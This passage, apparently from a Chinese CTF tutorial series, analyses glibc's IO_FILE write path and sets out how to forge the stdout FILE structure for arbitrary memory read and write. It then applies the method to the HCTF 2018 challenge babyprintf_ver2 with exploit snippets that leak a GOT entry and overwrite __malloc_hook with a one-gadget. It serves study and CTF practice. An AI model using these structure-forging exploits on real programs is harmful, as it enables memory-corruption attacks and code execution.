        _IO_size_t count = 0;
    ...
        ## 判断输出缓冲区还有多少空间
        else if (f->_IO_write_end > f->_IO_write_ptr)
        count = f->_IO_write_end - f->_IO_write_ptr; /* Space available. */
      ## 如果输出缓冲区有空间，则先把数据拷贝至输出缓冲区
      if (count > 0)
        {    
        ...
        //memcpy
        }
        if (to_do + must_flush > 0)
        {
          if (_IO_OVERFLOW (f, EOF) == EOF)
当`f->_IO_write_end >
f->_IO_write_ptr`时，会调用memcpy拷贝数据，因此最好构造条件`f->_IO_write_end`等于`f->_IO_write_ptr`。
接着进入`_IO_OVERFLOW`函数，去刷新输出缓冲区，跟进去：
    int
    _IO_new_file_overflow (_IO_FILE *f, int ch)
    {
      ## 判断标志位是否包含_IO_NO_WRITES
      if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
        {
          f->_flags |= _IO_ERR_SEEN;
          __set_errno (EBADF);
          return EOF;
        }
      ## 判断输出缓冲区是否为空
      if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)
        {
          ...
        }
      ## 输出输出缓冲区 
      if (ch == EOF)
        return _IO_do_write (f, f->_IO_write_base,
                 f->_IO_write_ptr - f->_IO_write_base);
      return (unsigned char) ch;
    }
    libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)
可以看到`_IO_new_file_overflow`，首先判断`_flags`是否包含`_IO_NO_WRITES`，如果包含则直接返回，因此需构造`_flags`不包含`_IO_NO_WRITES`，其定义为`#define
_IO_NO_WRITES 8`；
接着判断缓冲区是否为空以及是否不包含`_IO_CURRENTLY_PUTTING`标志位，如果不包含的话则做一些多余的操作，可能不可控，因此最好定义`_flags`包含`_IO_CURRENTLY_PUTTING`，其定义为`#define
_IO_CURRENTLY_PUTTING 0x800`。
接着调用`_IO_do_write`去输出输出缓冲区，其传入的参数是`f->_IO_write_base`，大小为`f->_IO_write_ptr -f->_IO_write_base`。因此若想实现任意地址读，应构造`_IO_write_base`为`read_start`，构造`_IO_write_ptr`为`read_end`。
跟进去`_IO_do_write`，看该函数的关键代码：
    static
    _IO_size_t
    new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
    {
      ...
      _IO_size_t count;
      if (fp->_flags & _IO_IS_APPENDING)
        fp->_offset = _IO_pos_BAD;
      else if (fp->_IO_read_end != fp->_IO_write_base)
        {
          _IO_off64_t new_pos
        = _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
          if (new_pos == _IO_pos_BAD)
        return 0;
          fp->_offset = new_pos;
        }
      ## 调用函数输出输出缓冲区
      count = _IO_SYSWRITE (fp, data, to_do);
      ...
      return count;
    }
看到在调用`_IO_SYSWRITE`之前还判断了`fp->_IO_read_end !=
fp->_IO_write_base`，因此需要构造结构体使得`_IO_read_end`等于`_IO_write_base`。
也可以构造`_flags`包含`_IO_IS_APPENDING`，`_IO_IS_APPENDING`的定义为`#define
_IO_IS_APPENDING
0x1000`，这样就不会走后面的这个判断而直接执行到`_IO_SYSWRITE`了，一般我都是设置`_IO_read_end`等于`_IO_write_base`。
最后`_IO_SYSWRITE`调用`write (f->_fileno, data,
to_do)`输出数据，因此还需构造`_fileno`为标准输出描述符1。
将上述条件综合描述为：
  1. 设置`_flag &~ _IO_NO_WRITES`即`_flag &~ 0x8`。
  2. 设置`_flag & _IO_CURRENTLY_PUTTING`即`_flag | 0x800`
  3. 设置`_fileno`为1。
  4. 设置`_IO_write_base`指向想要泄露的地方；`_IO_write_ptr`指向泄露结束的地址。
  5. 设置`_IO_read_end`等于`_IO_write_base`或设置`_flag & _IO_IS_APPENDING`即`_flag | 0x1000`。
  6. 设置`_IO_write_end`等于`_IO_write_ptr`（非必须）。
满足上述五个条件，可实现任意读。
### 实践
使用`stdout`进行任意读写比较经典的一题应该是hctf2018的`babyprintf_ver2`了，下面来进行利用描述。
题目直接给出了程序基址。
然后存在明显的溢出，可以覆盖`stdout`，但是无法覆盖`stdout`的vtable，因为它会修正。
具体该如何利用呢，首先使用`stdout`任意读来泄露libc地址。构造的FILE结构体如下（使用[pwn_debug](https://github.com/ray-cp/pwn_debug)的`IO_FILE_plus`模块）：
    io_stdout_struct=IO_FILE_plus()
    flag=0
    flag&=~8
    flag|=0x800
    flag|=0x8000
    io_stdout_struct._flags=flag
    io_stdout_struct._IO_write_base=pro_base+elf.got['read']
    io_stdout_struct._IO_read_end=io_stdout_struct._IO_write_base
    io_stdout_struct._IO_write_ptr=pro_base+elf.got['read']+8
    io_stdout_struct._fileno=1
以此来泄露read的地址。
接着使用`stdout`的任意地址写来写`__malloc_hook`，构造的FILE结构体如下：
    io_stdout_struct=IO_FILE_plus()
    flag=0
    flag&=~8
    flag|=0x8000
    io_stdout_write=IO_FILE_plus()
    io_stdout_write._flags=flag
    io_stdout_write._IO_write_ptr=malloc_hook
    io_stdout_write._IO_write_end=malloc_hook+8
最终将one gaget
写入`malloc_hook`。如何触发malloc呢，可以使用输出较大的字符打印来触发malloc函数或是`%n`来触发，其中`%n`可触发malloc的原因是在于`__readonly_area`会通过`fopen`打开`maps`文件来读取内容来判断地址段是否可写，而`fopen`会调用`malloc`函数申请空间，因此触发。
可能会有人对于觉得`flag|=0x8000`这行构造代码觉得比较奇怪，需要解释下，在`printf`函数中会调用`_IO_acquire_lock_clear_flags2
(stdout)`来获取`lock`从而继续程序，如果没有`_IO_USER_LOCK`标志的话，程序会一直在循环，而`_IO_USER_LOCK`定义为`#define
_IO_USER_LOCK
0x8000`，因此需要设置`flag|=0x8000`才能够使exp顺利进行。`_IO_acquire_lock_clear_flags2
(stdout)`的汇编代码如下：
    0x7f0bcf15d850      mov    rbp, qword ptr [rip + 0x2a16f9]
    0x7f0bcf15d857     mov    rbx, qword ptr [rbp]
    0x7f0bcf15d85b     mov    eax, dword ptr [rbx]
    0x7f0bcf15d85d     and    eax, 0x8000
    0x7f0bcf15d862     jne    __printf_chk+202 
## 小结
使用IO
FILE来进行任意内存读写真的是个很强大的功能，构造起来也比较容易。但是对于FILE结构体的伪造，个人感觉可能最容易出问题的地方还是`_flags`字段的构造，可能某个地方不注意就导致程序走偏了，因此感觉可能还是把默认的`stdout`和`stdin`直接拷贝出来用会比较好一些，同时`pwn_debug`的`IO_FILE_plus`模块提供了api`arbitrary_write_check`以及`arbitrary_read_check`来进行相应检测，看相应字段是否设置正确。
至此IO FILE系列描述完毕，前四篇对IO函数fopen、fread、fwrite以及fclose的源码分析；后面三篇介绍了针对IO
FILE的相关利用，包括劫持vtable、vtable引入的check机制以及相应的后续利用方式。在整个过程中为方便构造IO
结构体还在`pwn_debug`中加入了`IO_FILE_plus`模块。
最后一句，阅读源码对于学习是一件很有帮助的事情。
相关文件及脚本[链接](https://github.com/ray-cp/pwn_category/tree/master/IO_FILE/arbitrary_read_write)
## 参考链接
  1. [HCTF 2018 部分 PWN writeup--babyprinf_ver2](https://ray-cp.github.io/archivers/HCTF-2018-PWN-writeup#babyprintf_ver2)
  2. [浅析IO_FILE结构及利用](https://xz.aliyun.com/t/3344#toc-1)
  3. [教练！那根本不是IO！——从printf源码看libc的IO](https://www.anquanke.com/post/id/86945)